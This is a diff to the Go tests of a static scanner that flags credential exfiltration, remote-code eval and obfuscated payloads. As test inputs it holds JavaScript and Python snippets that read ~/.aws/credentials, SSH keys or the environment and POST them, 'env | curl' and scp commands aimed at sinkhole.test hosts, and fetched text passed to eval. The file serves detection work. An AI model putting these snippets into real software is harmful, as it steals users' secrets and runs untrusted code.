@@ -186,6 +186,12 @@ func TestAnalyze(t *testing.T) {
 		{name: "credential path far from the network use", path: "a.py", data: "key = open(home + '/.ssh/id_rsa').read()\n" + strings.Repeat("work()\n", 150) + "requests.get(url)\n"},
 		{name: "credential path in help text and scp in prose", path: "a.py", data: "help = 'copy ~/.ssh/id_rsa to the host, then scp the files'\n"},
 		{name: "credential path in an scp command", path: "a.py", data: "run('scp -r ~/.ssh/id_rsa user@host.sinkhole.test:/tmp')\n", want: []string{"EXFIL-001:1"}},
+		{name: "credential file read far from the request that sends it", path: "a.js", data: "const stolen = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n" + strings.Repeat("work();\n", 150) + "fetch(url, { method: 'POST', body: stolen });\n", want: []string{"EXFIL-001:1"}},
+		{name: "python credential file read far from the request that sends it", path: "a.py", data: "secret = open(os.path.expanduser('~/.aws/credentials')).read()\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=secret)\n", want: []string{"EXFIL-001:1"}},
+		{name: "credential file passed on far from the request", path: "a.py", data: "secret = open(os.path.expanduser('~/.aws/credentials')).read()\nbundle = [secret]\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=bundle)\n", want: []string{"EXFIL-001:1"}},
+		{name: "credential file far from a request that does not use it", path: "a.py", data: "secret = open(os.path.expanduser('~/.aws/credentials')).read()\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=other)\n"},
+		{name: "credential path in a docstring far from a request", path: "a.py", data: "\"\"\"Reads $HOME/.docker/config.json if present.\"\"\"\n" + strings.Repeat("work()\n", 150) + "requests.post(url, data=other)\n"},
+		{name: "credential file with a short variable name far from a request", path: "a.js", data: "const k = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: k });\n"},
 		{name: "fetch as a method of another object", path: "a.js", data: "const key = process.env.API_KEY;\nfetcher.fetch(url);\n"},
 		{name: "fetch as a method of window", path: "a.js", data: "const key = process.env.API_KEY;\nwindow.fetch(url);\n", want: []string{"EXFIL-002:1"}},
 		{name: "fetch definition", path: "a.js", data: "const key = process.env.API_KEY;\nasync function fetch(url) {\n}\n"},
@@ -194,6 +200,58 @@ func TestAnalyze(t *testing.T) {
 		{name: "env dump piped on by a command", path: "a.js", data: "run('env | curl -d @- https://a.sinkhole.test');\n", want: []string{"EXFIL-001:1"}},
 		{name: "network use in a comment", path: "a.js", data: "const d = JSON.stringify(process.env);\n// fetch(url)\n"},
 		{name: "secret read after a block comment on one line", path: "a.js", data: "/* config loader */ const env = require('fs').readFileSync('.env'); require('https').request(o).end(env);\n", want: []string{"EXFIL-001:1"}},
+
+		{name: "credential directory joined from the home directory", path: "a.js", data: "const dir = path.join(os.homedir(), '.ssh');\nconst names = fs.readdirSync(dir);\nfetch(url, { method: 'POST', body: names });\n", want: []string{"EXFIL-001:1"}},
+		{name: "credential path resolved from segments", path: "a.js", data: "const f = fs.readFileSync(path.resolve(os.homedir(), '.aws', 'credentials'));\nfetch(url, { method: 'POST', body: f });\n", want: []string{"EXFIL-001:1"}},
+		{name: "npm token file joined from segments", path: "a.js", data: "const rc = fs.readFileSync(path.join(os.homedir(), `.npmrc`), 'utf8');\nfetch(url, { body: rc });\n", want: []string{"EXFIL-001:1"}},
+		{name: "python credential path joined from segments", path: "a.py", data: "p = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')\nrequests.post(url, data=open(p).read())\n", want: []string{"EXFIL-001:1"}},
+		{name: "python pathlib credential path", path: "a.py", data: "cfg = Path.home() / '.kube' / 'config'\nrequests.post(url, data=cfg.read_text())\n", want: []string{"EXFIL-001:1"}},
+		{name: "python pathlib netrc", path: "a.py", data: "rc = (Path.home() / \".netrc\").read_text()\nrequests.post(url, data=rc)\n", want: []string{"EXFIL-001:1"}},
+		{name: "env file read from joined segments", path: "a.js", data: "const e = fs.readFileSync(path.join(root, '.env'), 'utf8');\nfetch(url, { body: e });\n", want: []string{"EXFIL-001:1"}},
+		{name: "env example joined from segments", path: "a.js", data: "const t = fs.readFileSync(path.join(__dirname, '.env.example'), 'utf8');\nfetch(url);\n"},
+		{name: "env file joined but not read", path: "a.js", data: "const p = path.join(__dirname, '.env');\nfetch(url);\n"},
+		{name: "dotenv config with a joined env path", path: "a.js", data: "require('dotenv').config({ path: path.join(root, '.env') });\nfetch(url);\n"},
+		{name: "credential directory names in a list", path: "a.js", data: "const dirs = ['.ssh', '.aws'];\nfetch(url);\n"},
+		{name: "tool reads its own npm config without network", path: "a.js", data: "const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\nconsole.log(rc);\n"},
+
+		{name: "response text handed to eval", path: "a.js", data: "fetch(url).then((r) => r.text()).then(eval);\n", want: []string{"EXEC-001:1"}},
+		{name: "response text evaluated in an arrow callback", path: "a.js", data: "fetch(url).then((r) => r.text()).then((t) => eval(t));\n", want: []string{"EXEC-001:1"}},
+		{name: "response text evaluated in a function callback", path: "a.js", data: "fetch(url)\n  .then(function (r) { return r.text(); })\n  .then(function (t) { eval(t); });\n", want: []string{"EXEC-001:3"}},
+		{name: "stream body evaluated at the end of the response", path: "a.js", data: "http.get(url, (res) => {\n  let body = '';\n  res.on('data', (c) => { body += c; });\n  res.on('end', () => eval(body));\n});\n", want: []string{"EXEC-001:4"}},
+		{name: "new Function of a response text", path: "a.js", data: "const r = await fetch(url);\nconst f = new Function(await r.text());\nf();\n", want: []string{"EXEC-001:2"}},
+		{name: "Function of axios data", path: "a.js", data: "const { data } = await axios.get(url);\nFunction(data)();\n", want: []string{"EXEC-001:2"}},
+		{name: "fetched json is not code", path: "a.js", data: "fetch(url).then((r) => r.json()).then(console.log);\n"},
+		{name: "fetched text parsed as json", path: "a.js", data: "const j = JSON.parse(await (await fetch(url)).text());\neval(\"1\");\n"},
+		{name: "eval of a variable far from the fetch", path: "a.js", data: "const r = await fetch(url);\n" + strings.Repeat("work();\n", 40) + "eval(code);\n"},
+		{name: "eval of a variable with no network call", path: "a.js", data: "list.map((t) => eval(t));\nPromise.resolve(code).then(eval);\n"},
+		{name: "timer of a variable next to a fetch", path: "a.js", data: "const r = await fetch(url);\nsetTimeout(tick, 10);\n"},
+
+		{name: "module bound in a later statement", path: "a.js", data: "let h;\ntry {\n  h = require('https');\n} catch (e) {}\nconst env = fs.readFileSync('.env', 'utf8');\nh.request(o).end(env);\n", want: []string{"EXFIL-001:5"}},
+		{name: "module bound on the line after the equals sign", path: "a.js", data: "const h =\n  require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nh.request(o).end(env);\n", want: []string{"EXFIL-001:3"}},
+		{name: "module copied to another name", path: "a.js", data: "const a = require('https');\nconst b = a;\nconst env = fs.readFileSync('.env', 'utf8');\nb.request(o).end(env);\n", want: []string{"EXFIL-001:3"}},
+		{name: "module copied twice", path: "a.js", data: "const a = require('https');\nconst b = a;\nconst c = b\nconst env = fs.readFileSync('.env', 'utf8');\nc.request(o).end(env);\n", want: []string{"EXFIL-001:4"}},
+		{name: "function renamed by destructuring", path: "a.js", data: "const { request: r } = require('https');\nconst env = fs.readFileSync('.env', 'utf8');\nr(o).end(env);\n", want: []string{"EXFIL-001:2"}},
+		{name: "default export of an imported module", path: "a.mjs", data: "import h from 'https';\nconst env = readFileSync('.env', 'utf8');\nh.default.request(o).end(env);\n", want: []string{"EXFIL-001:2"}},
+		{name: "request through a namespace import of https", path: "a.mjs", data: "import * as h from 'https';\nconst env = readFileSync('.env', 'utf8');\nh.request(o).end(env);\n", want: []string{"EXFIL-001:2"}},
+		{name: "copy of a module that is not a network module", path: "a.js", data: "const a = require('fs');\nconst b = a;\nconst env = b.readFileSync('.env', 'utf8');\nb.get(env);\n"},
+		{name: "comparison is not a copy", path: "a.js", data: "const a = require('https');\nif (b == a) {}\nconst env = fs.readFileSync('.env', 'utf8');\nb.request(o).end(env);\n"},
+		{name: "property assignment is not a copy", path: "a.js", data: "const a = require('https');\nthis.b = a;\nconst env = fs.readFileSync('.env', 'utf8');\nb.request(o).end(env);\n"},
+		{name: "more names than the alias cap", path: "a.js", data: manyAliases()},
+		{name: "python module imported by name", path: "a.py", data: "u = __import__('requests')\nu.post(url, data=open('.env').read())\n", want: []string{"EXFIL-001:2"}},
+		{name: "python request module imported by its package name", path: "a.py", data: "u = __import__('urllib.request')\nu.request.urlopen(url, open('.env').read())\n", want: []string{"EXFIL-001:2"}},
+		{name: "python module imported inline", path: "a.py", data: "__import__('requests').post(url, data=open('.env').read())\n", want: []string{"EXFIL-001:1"}},
+		{name: "python module imported with importlib", path: "a.py", data: "r = importlib.import_module('requests')\nr.post(url, data=open('.env').read())\n", want: []string{"EXFIL-001:2"}},
+		{name: "python import of a module that is not a network module", path: "a.py", data: "u = __import__('json')\nu.get(url, open('.env').read())\n"},
+
+		{name: "environment copy passed to a second variable", path: "a.js", data: "const e = { ...process.env };\nconst p = e;\nfetch(url, { method: 'POST', body: JSON.stringify(p) });\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment copied with Object.assign", path: "a.js", data: "const e = Object.assign({}, process.env);\nfetch(url, { body: JSON.stringify(e) });\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment encoded into a second variable", path: "a.js", data: "const e = { ...process.env };\nconst payload = Buffer.from(JSON.stringify(e));\nfetch(url, { body: payload });\n", want: []string{"EXFIL-001:1"}},
+		{name: "python environment dict passed to a second variable", path: "a.py", data: "d = dict(os.environ)\npayload = d\nrequests.post(url, data=payload)\n", want: []string{"EXFIL-001:1"}},
+		{name: "environment destructured to one variable", path: "a.js", data: "const { NODE_ENV } = process.env;\nfetch(url, { body: NODE_ENV });\n"},
+		{name: "one property of an environment copy", path: "a.js", data: "const e = { ...process.env };\nconst mode = e.NODE_ENV;\nfetch(url, { body: mode });\n"},
+		{name: "environment copy extended for a child", path: "a.js", data: "const e = Object.assign({}, process.env, { A: 1 });\nrun(cmd, { env: e });\nfetch(url, { body: other });\n"},
+		{name: "environment copy with a request 80 lines later", path: "a.py", data: "env = os.environ.copy()\n" + strings.Repeat("work()\n", 80) + "urllib.request.urlopen(url)\n"},
+		{name: "environment copy far from a request that uses it", path: "a.js", data: "const e = { ...process.env };\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: JSON.stringify(e) });\n"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -204,6 +262,25 @@ func TestAnalyze(t *testing.T) {
 			}
 		})
 	}
+}
+
+// rulesAt lists n findings of rule on consecutive lines from line.
+func rulesAt(rule string, line, n int) []string {
+	var out []string
+	for i := range n {
+		out = append(out, fmt.Sprintf("%s:%d", rule, line+i))
+	}
+	return out
+}
+
+// manyAliases binds one name more than the alias cap and uses the last one.
+func manyAliases() string {
+	var b strings.Builder
+	for i := range 33 {
+		fmt.Fprintf(&b, "const a%d = require('https');\n", i)
+	}
+	b.WriteString("const env = fs.readFileSync('.env', 'utf8');\na32.request(o).end(env);\n")
+	return b.String()
 }
 
 // binaryBytes returns n bytes that are not text.
@@ -294,6 +371,116 @@ func TestEvidence(t *testing.T) {
 	}
 }
 
+func TestSeverity(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		path string
+		data string
+		// expectations
+		wantSeverity protocol.Severity
+		wantLines    []int // lines of the evidence
+	}{
+		{
+			name:         "secret and network use close together are critical",
+			path:         "a.js",
+			data:         "const stolen = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\nfetch(url, { body: stolen });\n",
+			wantSeverity: protocol.SeverityCritical,
+			wantLines:    []int{1, 2},
+		},
+		{
+			name:         "secret and network use far apart are high, with both places",
+			path:         "a.js",
+			data:         "const stolen = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n" + strings.Repeat("work();\n", 150) + "fetch(url, { body: stolen });\n",
+			wantSeverity: protocol.SeverityHigh,
+			wantLines:    []int{1, 152},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, out := analyzeFile(t, tt.path, tt.data)
+
+			if len(out.Findings) != 1 {
+				t.Fatalf("findings = %+v, want one", out.Findings)
+			}
+			fi := out.Findings[0]
+			var lines []int
+			for _, e := range fi.Evidence {
+				lines = append(lines, e.Line)
+			}
+			if fi.RuleID != "GAL-EXFIL-001" || fi.Severity != tt.wantSeverity || !slices.Equal(lines, tt.wantLines) {
+				t.Errorf("finding = %s %s at lines %v, want GAL-EXFIL-001 %s at %v", fi.RuleID, fi.Severity, lines, tt.wantSeverity, tt.wantLines)
+			}
+		})
+	}
+}
+
+func TestIndicators(t *testing.T) {
+	payload := "const u = 'https://c2.sinkhole.test/collect';\nmail('ops@bad.sinkhole.test');\nfetch(u);\n" + strings.Repeat("// 0123456789 padding\n", 12)
+	tests := []struct {
+		name string
+		// inputs
+		data string
+		// expectations
+		wantIOCs []protocol.IOC
+	}{
+		{
+			name: "blob that decodes to text lists its indicators at the line of the literal",
+			data: "a();\nvar p = '" + b64(payload) + "';\n",
+			wantIOCs: []protocol.IOC{
+				{Type: "url", Value: "https://c2.sinkhole.test/collect", Path: "a.js", Line: 2},
+				{Type: "domain", Value: "c2.sinkhole.test", Path: "a.js", Line: 2},
+				{Type: "email", Value: "ops@bad.sinkhole.test", Path: "a.js", Line: 2},
+				{Type: "domain", Value: "bad.sinkhole.test", Path: "a.js", Line: 2},
+			},
+		},
+		{
+			name: "same indicator twice in a blob is listed once",
+			data: "var p = '" + b64(strings.Repeat("// see https://c2.sinkhole.test/x\n", 12)) + "';\n",
+			wantIOCs: []protocol.IOC{
+				{Type: "url", Value: "https://c2.sinkhole.test/x", Path: "a.js", Line: 1},
+				{Type: "domain", Value: "c2.sinkhole.test", Path: "a.js", Line: 1},
+			},
+		},
+		{name: "blob of binary data has none", data: "ICON = '" + base64.StdEncoding.EncodeToString(binaryBytes(300)) + "'\n"},
+		{name: "indicator in the clear is left to the ioc analyzer", data: "var u = 'https://c2.sinkhole.test/x';\n"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, out := analyzeFile(t, "a.js", tt.data)
+
+			if !slices.Equal(out.IOCs, tt.wantIOCs) {
+				t.Errorf("iocs = %+v, want %+v", out.IOCs, tt.wantIOCs)
+			}
+		})
+	}
+}
+
+func TestIndicatorsCapped(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		hosts int
+		// expectations
+		wantMax int
+	}{
+		{name: "blob full of urls", hosts: 500, wantMax: 64},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			var b strings.Builder
+			for i := range tt.hosts {
+				fmt.Fprintf(&b, "// https://h%d.sinkhole.test/\n", i)
+			}
+			_, out := analyzeFile(t, "a.js", "var p = '"+b64(b.String())+"';\n")
+
+			if len(out.IOCs) != tt.wantMax {
+				t.Errorf("iocs = %d, want %d", len(out.IOCs), tt.wantMax)
+			}
+		})
+	}
+}
+
 func TestAnalyzeCapsFindings(t *testing.T) {
 	tests := []struct {
 		name string
@@ -344,6 +531,9 @@ func TestAnalyzeLimits(t *testing.T) {
 		{name: "payload across a window cut", path: "cut.js", data: strings.Repeat(";", 256<<10-4) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
 		{name: "1 MB of unclosed calls", path: "eval.js", data: strings.Repeat("eval(", 1<<20/5), wantSkipped: true},
 		{name: "2 MB blob on one line", path: "blob.js", data: "var x='" + unit(2<<20) + "';\n", wantRules: []string{"OBF-003:1"}},
+		{name: "many copies of an alias", path: "copies.js", data: strings.Repeat("b=h;", 1<<19) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n", wantRules: []string{"EXFIL-001:3"}},
+		{name: "900 credential path segments on separate lines", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 900) + "fetch(u);\n", wantRules: rulesAt("EXFIL-001", 801, protocol.MaxFindingsPerRulePerFile)},
+		{name: "1200 credential path segments are more than are checked", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 1200) + "fetch(u);\n", wantSkipped: true},
 		{name: "many assignments to look back through", path: "assign.py", data: strings.Repeat("a=", 2<<20) + "\nexec(a)\n"},
 	}
 	for _, tt := range tests {
@@ -351,7 +541,8 @@ func TestAnalyzeLimits(t *testing.T) {
 			start := time.Now()
 			got, out := analyzeFile(t, tt.path, tt.data)
 
-			if d := time.Since(start); d > 20*time.Second {
+			// The bound is generous: the race detector and the other test packages share the CPUs.
+			if d := time.Since(start); d > 60*time.Second {
 				t.Errorf("took %v", d)
 			}
 			if !slices.Equal(got, tt.wantRules) {
